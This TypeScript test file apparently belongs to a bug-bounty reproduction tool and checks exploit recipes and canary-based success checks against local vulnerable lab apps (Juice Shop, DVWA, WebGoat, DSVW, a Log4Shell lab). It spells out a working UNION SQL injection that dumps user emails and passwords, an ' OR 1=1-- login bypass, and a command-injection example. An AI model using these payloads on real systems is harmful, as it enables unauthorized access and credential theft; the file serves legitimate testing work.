import assert from "node:assert/strict";
import { randomBytes } from "node:crypto";
import test from "node:test";

import { getRecipesForTarget } from "./recipes";

const CONFIG = {
  baseUrl: "http://localhost:3000",
  searchPath: "/rest/products/search",
  canaryRegistrationPath: "/api/Users/",
};

function freshCanary(): string {
  return `${randomBytes(12).toString("base64url")}@bountydesk.test`;
}

test("an unrecognized target name gets no recipes", () => {
  assert.deepEqual(getRecipesForTarget({ name: "some-other-target", config: CONFIG }), []);
});

test("a recognized target name with an unrecognized config shape gets no recipes", () => {
  assert.deepEqual(
    getRecipesForTarget({ name: "juice-shop-v17.3.0", config: { searchPath: 1 } }),
    [],
  );
  assert.deepEqual(getRecipesForTarget({ name: "juice-shop-v17.3.0", config: null }), []);
  assert.deepEqual(getRecipesForTarget({ name: "juice-shop-v17.3.0", config: "nope" }), []);
});

test("juice-shop-v17.3.0 returns both recipes now that each oracle is fully provable", () => {
  const recipes = getRecipesForTarget({ name: "juice-shop-v17.3.0", config: CONFIG });
  assert.deepEqual(
    recipes.map((r) => r.id),
    ["juice-shop-sqli-search", "juice-shop-login-bypass"],
  );
});

test("the registration fixture matches decisions.md Q18 exactly", () => {
  const recipes = getRecipesForTarget({ name: "juice-shop-v17.3.0", config: CONFIG });
  for (const recipe of recipes) {
    assert.deepEqual(recipe.fixture.request, {
      method: "POST",
      path: "/api/Users/",
      body: {
        email: "{{canary}}",
        password: "bd-fixture-Only1!",
        passwordRepeat: "bd-fixture-Only1!",
      },
    });
  }
});

test("sqli-search negative control and exploit match decisions.md Q18 exactly", () => {
  const [sqli] = getRecipesForTarget({ name: "juice-shop-v17.3.0", config: CONFIG });

  assert.deepEqual(sqli.negativeControl, {
    method: "GET",
    path: "/rest/products/search?q=apple",
  });

  // The frozen payload, percent-encoded as a query-string value. Computed independently here
  // (not by calling encodeURIComponent on the same literal the recipe uses) so this test would
  // actually catch a change to either side.
  assert.deepEqual(sqli.exploit, {
    method: "GET",
    path:
      "/rest/products/search?q=qwert'))%20UNION%20SELECT%20id%2Cemail%2Cpassword%2C" +
      "'4'%2C'5'%2C'6'%2C'7'%2C'8'%2C'9'%20FROM%20Users--",
  });
});

test("sqli-search oracle: canary in the injected email field (returned as \"name\") is true", async () => {
  const [sqli] = getRecipesForTarget({ name: "juice-shop-v17.3.0", config: CONFIG });
  const canary = freshCanary();
  const body = JSON.stringify({
    status: "success",
    data: [
      { id: 1, name: "Apple Juice", description: "Real product, no canary here" },
      { id: 2, name: canary, description: "$2a$hashedpassword" },
    ],
  });

  assert.equal(await sqli.oracleCheck({ status: 200, body }, canary), true);
});

test("sqli-search oracle: canary absent from every row is false", async () => {
  const [sqli] = getRecipesForTarget({ name: "juice-shop-v17.3.0", config: CONFIG });
  const canary = freshCanary();
  const body = JSON.stringify({
    status: "success",
    data: [{ id: 1, name: "Apple Juice", description: "nothing here" }],
  });

  assert.equal(await sqli.oracleCheck({ status: 200, body }, canary), false);
});

test("sqli-search oracle: canary as a coincidental substring outside the name field is false", async () => {
  const [sqli] = getRecipesForTarget({ name: "juice-shop-v17.3.0", config: CONFIG });
  const canary = freshCanary();
  // The canary shows up verbatim in the response -- in the injected password column (which the
  // UNION returns under "description", not "name") and in a top-level field entirely outside
  // any row. A substring search over the raw body would wrongly call this reproduced.
  const body = JSON.stringify({
    status: "success",
    data: [{ id: 1, name: "Apple Juice", description: canary }],
    debugNote: canary,
  });

  assert.equal(await sqli.oracleCheck({ status: 200, body }, canary), false);
});

test("sqli-search oracle: a non-JSON body does not throw and is false", async () => {
  const [sqli] = getRecipesForTarget({ name: "juice-shop-v17.3.0", config: CONFIG });
  const canary = freshCanary();
  assert.equal(await sqli.oracleCheck({ status: 500, body: "<html>not json</html>" }, canary), false);
});

test("sqli-search oracle: a JSON error response containing the canary is false", async () => {
  const [sqli] = getRecipesForTarget({ name: "juice-shop-v17.3.0", config: CONFIG });
  const canary = freshCanary();
  const body = JSON.stringify({ data: [{ name: canary }] });

  assert.equal(await sqli.oracleCheck({ status: 500, body }, canary), false);
});

function loginBypassRecipe() {
  const [, loginBypass] = getRecipesForTarget({ name: "juice-shop-v17.3.0", config: CONFIG });
  return loginBypass;
}

test("login-bypass negative control and exploit match decisions.md Q18 exactly", () => {
  const recipe = loginBypassRecipe();

  assert.deepEqual(recipe.negativeControl, {
    method: "POST",
    path: "/rest/user/login",
    body: { email: "{{canary}}", password: "definitely-the-wrong-password" },
  });
  assert.deepEqual(recipe.negativeControlAcceptedStatuses, [401]);

  assert.deepEqual(recipe.exploit, {
    method: "POST",
    path: "/rest/user/login",
    body: { email: "' OR 1=1--", password: "x" },
  });
});

test("login-bypass negative-control oracle: a rejected login (no token) is false", () => {
  const recipe = loginBypassRecipe();
  const canary = freshCanary();
  const body = JSON.stringify({ status: 401, message: "Invalid email or password" });

  assert.equal(recipe.oracleCheck({ status: 401, body }, canary), false);
});

test("login-bypass negative-control oracle: a token in the response is true", () => {
  const recipe = loginBypassRecipe();
  const canary = freshCanary();
  const body = JSON.stringify({ authentication: { token: "a.jwt.token", bid: 1, umail: canary } });

  assert.equal(recipe.oracleCheck({ status: 200, body }, canary), true);
});

test("login-bypass follow-up: buildRequest extracts the token as a Bearer header against /api/Users", () => {
  const recipe = loginBypassRecipe();
  const exploitResponse = {
    status: 200,
    body: JSON.stringify({ authentication: { token: "minted-jwt", bid: 1, umail: "admin@juice-sh.op" } }),
  };

  assert.deepEqual(recipe.exploitFollowUp?.buildRequest(exploitResponse), {
    method: "GET",
    path: "/api/Users",
    headers: { Authorization: "Bearer minted-jwt" },
  });
});

test("login-bypass follow-up: buildRequest returns undefined when the exploit minted no token", () => {
  const recipe = loginBypassRecipe();

  assert.equal(
    recipe.exploitFollowUp?.buildRequest({ status: 401, body: JSON.stringify({ message: "Invalid email or password" }) }),
    undefined,
  );
  assert.equal(recipe.exploitFollowUp?.buildRequest({ status: 200, body: "not json" }), undefined);
  assert.equal(recipe.exploitFollowUp?.buildRequest({ status: 200, body: JSON.stringify({}) }), undefined);
});

test("login-bypass follow-up oracle: this run's canary in /api/Users proves the token grants access", async () => {
  const recipe = loginBypassRecipe();
  const canary = freshCanary();
  const body = JSON.stringify({
    status: "success",
    data: [
      { id: 1, email: "admin@juice-sh.op", role: "admin" },
      { id: 2, email: canary, role: "customer" },
    ],
  });

  assert.equal(await recipe.exploitFollowUp?.oracleCheck({ status: 200, body }, canary), true);
});

test("login-bypass follow-up oracle: a token that opens /api/Users but without this run's canary is false", async () => {
  // This is exactly the case the withheld "was any token minted" check couldn't distinguish:
  // a real admin dump came back, but not proven to be *this run's* canary-linked proof.
  const recipe = loginBypassRecipe();
  const canary = freshCanary();
  const body = JSON.stringify({
    status: "success",
    data: [{ id: 1, email: "admin@juice-sh.op", role: "admin" }],
  });

  assert.equal(await recipe.exploitFollowUp?.oracleCheck({ status: 200, body }, canary), false);
});

test("login-bypass follow-up oracle: a non-JSON /api/Users response does not throw and is false", async () => {
  const recipe = loginBypassRecipe();
  const canary = freshCanary();

  assert.equal(await recipe.exploitFollowUp?.oracleCheck({ status: 200, body: "<html>nope</html>" }, canary), false);
});

// The four onboarding targets beyond juice-shop. These validate the recipe lookup and each
// oracle's parsing against synthetic responses, the same way the juice-shop cases above do; no
// live target is involved. The delivery gaps each recipe documents (form-encoding, GET/header
// canary substitution, the out-of-band Log4Shell oracle) are orchestrator work, not recipe work,
// and are tracked in docs/additional-targets.md.

const DVWA_CONFIG = { baseUrl: "http://localhost:80", commandInjectionPath: "/vulnerabilities/exec/" };
const WEBGOAT_CONFIG = {
  baseUrl: "http://localhost:8080",
  sqlInjectionPath: "/WebGoat/SqlInjection/assignment5a",
};
const DSVW_CONFIG = { baseUrl: "http://localhost:65412", sqlInjectionPath: "/" };
const LOG4SHELL_CONFIG = {
  baseUrl: "http://localhost:8080",
  injectionPath: "/",
  injectionHeader: "X-Api-Version",
};

function onlyRecipe(name: string, config: unknown) {
  const recipes = getRecipesForTarget({ name, config });
  assert.equal(recipes.length, 1, `${name} should resolve exactly one recipe`);
  return recipes[0];
}

test("each onboarding target resolves its one recipe by name and config", () => {
  assert.equal(onlyRecipe("dvwa", DVWA_CONFIG).id, "dvwa-command-injection");
  assert.equal(onlyRecipe("webgoat", WEBGOAT_CONFIG).id, "webgoat-sqli-lesson");
  assert.equal(onlyRecipe("dsvw", DSVW_CONFIG).id, "dsvw-sqli");
  assert.equal(onlyRecipe("log4shell-cve-lab", LOG4SHELL_CONFIG).id, "log4shell-jndi");
});

test("an onboarding target with a config missing its recipe's fields gets no recipes", () => {
  assert.deepEqual(getRecipesForTarget({ name: "dvwa", config: { baseUrl: "http://localhost:80" } }), []);
  assert.deepEqual(getRecipesForTarget({ name: "webgoat", config: null }), []);
  assert.deepEqual(getRecipesForTarget({ name: "dsvw", config: "nope" }), []);
  assert.deepEqual(
    getRecipesForTarget({ name: "log4shell-cve-lab", config: { baseUrl: "http://localhost:8080" } }),
    [],
  );
});

test("every onboarding recipe carries the canary placeholder in its exploit", () => {
  const dvwa = onlyRecipe("dvwa", DVWA_CONFIG);
  assert.ok(JSON.stringify(dvwa.exploit.body).includes("{{canary}}"));

  const webgoat = onlyRecipe("webgoat", WEBGOAT_CONFIG);
  assert.ok(JSON.stringify(webgoat.exploit.body).includes("{{canary}}"));

  // DSVW and Log4Shell carry the placeholder in the path/header, where the orchestrator does not
  // substitute it yet; the placeholder is kept so the recipe is already correct once it does.
  const dsvw = onlyRecipe("dsvw", DSVW_CONFIG);
  assert.ok(dsvw.exploit.path.includes(encodeURIComponent("{{canary}}")));

  const log4shell = onlyRecipe("log4shell-cve-lab", LOG4SHELL_CONFIG);
  assert.ok(log4shell.exploit.headers?.["X-Api-Version"]?.includes("{{canary}}"));
});

test("dvwa oracle: the canary in command output (a <pre> block) is true", async () => {
  const dvwa = onlyRecipe("dvwa", DVWA_CONFIG);
  const canary = freshCanary();
  const body = `<div>ping</div><pre>PING 127.0.0.1: 56 data bytes\n${canary}\n</pre>`;
  assert.equal(await dvwa.oracleCheck({ status: 200, body }, canary), true);
});

test("dvwa oracle: the canary only outside any <pre> block is false", async () => {
  const dvwa = onlyRecipe("dvwa", DVWA_CONFIG);
  const canary = freshCanary();
  // A page that reflected our submitted command but never ran it: canary is present, but not in
  // command output.
  const body = `<p>You entered: 127.0.0.1; echo ${canary}</p><pre>PING 127.0.0.1</pre>`;
  assert.equal(await dvwa.oracleCheck({ status: 200, body }, canary), false);
});

test("dvwa oracle: a non-200 response is false even if it contains the canary", async () => {
  const dvwa = onlyRecipe("dvwa", DVWA_CONFIG);
  const canary = freshCanary();
  assert.equal(await dvwa.oracleCheck({ status: 302, body: `<pre>${canary}</pre>` }, canary), false);
});

test("webgoat oracle: the canary in the lesson output field is true", async () => {
  const webgoat = onlyRecipe("webgoat", WEBGOAT_CONFIG);
  const canary = freshCanary();
  const body = JSON.stringify({ lessonCompleted: true, feedback: "well done", output: `<table><tr><td>${canary}</td></tr></table>` });
  assert.equal(await webgoat.oracleCheck({ status: 200, body }, canary), true);
});

test("webgoat oracle: the canary only in feedback, not output, is false", async () => {
  const webgoat = onlyRecipe("webgoat", WEBGOAT_CONFIG);
  const canary = freshCanary();
  const body = JSON.stringify({ lessonCompleted: false, feedback: `no rows for ${canary}`, output: "" });
  assert.equal(await webgoat.oracleCheck({ status: 200, body }, canary), false);
});

test("webgoat oracle: a non-JSON body does not throw and is false", async () => {
  const webgoat = onlyRecipe("webgoat", WEBGOAT_CONFIG);
  const canary = freshCanary();
  assert.equal(await webgoat.oracleCheck({ status: 200, body: "<html>not json</html>" }, canary), false);
});

test("dsvw oracle: the canary reflected in the response is true, absent is false", async () => {
  const dsvw = onlyRecipe("dsvw", DSVW_CONFIG);
  const canary = freshCanary();
  assert.equal(await dsvw.oracleCheck({ status: 200, body: `<div>user: ${canary}</div>` }, canary), true);
  assert.equal(await dsvw.oracleCheck({ status: 200, body: "<div>user: admin</div>" }, canary), false);
});

test("log4shell oracle: the in-band canary echo is true, a non-200 is false", async () => {
  const log4shell = onlyRecipe("log4shell-cve-lab", LOG4SHELL_CONFIG);
  const canary = freshCanary();
  assert.equal(await log4shell.oracleCheck({ status: 200, body: `resolved ${canary}` }, canary), true);
  assert.equal(await log4shell.oracleCheck({ status: 500, body: canary }, canary), false);
});
